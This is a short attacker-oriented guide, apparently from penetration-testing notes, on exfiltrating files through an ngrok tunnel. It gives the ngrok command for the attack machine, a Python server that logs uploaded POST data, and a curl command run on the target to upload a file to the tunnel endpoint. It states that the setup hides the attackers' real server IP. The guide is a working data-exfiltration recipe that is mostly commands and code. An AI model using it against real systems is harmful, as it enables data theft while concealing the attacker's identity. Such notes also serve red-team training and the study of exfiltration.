# Send Data via Ngrok

Follow the instructions of [the Ngrok official documentation](https://dashboard.ngrok.com/get-started/setup/linux) to set up the configurations.

## 1. Start Tunnel

In attack machine, run the following command:

```sh
ngrok http http://localhost:8080
```

In the `ngrok` command above, the endpoint URL (`https://xxxx-xxx-xxx-xxx-xxx.ngrok-free.app`) is displayed.

## 2. Start HTTP Server

We need to prepare a custom HTTP server because a default server does not allow the POST method. So create a new Python file:

```py
# server.py
from http.server import HTTPServer
from http.server import BaseHTTPRequestHandler


class CustomHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', "text/html")
        self.end_headers()
        html_context = '<html lang="ja">' \
                       '<meta charset="UTF-8"><form method="POST" action="/">' \
                       '<input type="hidden" name="word" value="abcde">' \
                       '<input type="submit" value="送信">' \
                       '</form>' \
                       '</html>'
        self.wfile.write(html_context.encode())

    def do_POST(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.end_headers()
        print(self.rfile.read(int(self.headers['content-length'])).decode('utf-8'))
        html_context = "送信完了"
        self.wfile.write(html_context.encode())


server_address = ('localhost', 8080)
httpd = HTTPServer(server_address, CustomHTTPRequestHandler)
httpd.serve_forever()
```

Now start the server:

```sh
python3 server.py
```

The `http://localhost:8080` opens for receiving requests.

## 3. Send Data to the Endpoint

In target machine, run the following command to send data:

```powershell
curl -F "file=@./data.txt" https://xxxx-xxx-xxx-xxx-xxx.ngrok-free.app
```

Note that we specify the endpoint URL of the Ngrok (`https://xxxx-xxx-xxx-xxx-xxx.ngrok-free.app`).  

By this, we (attackers) can anonymize our actual server IP addresses.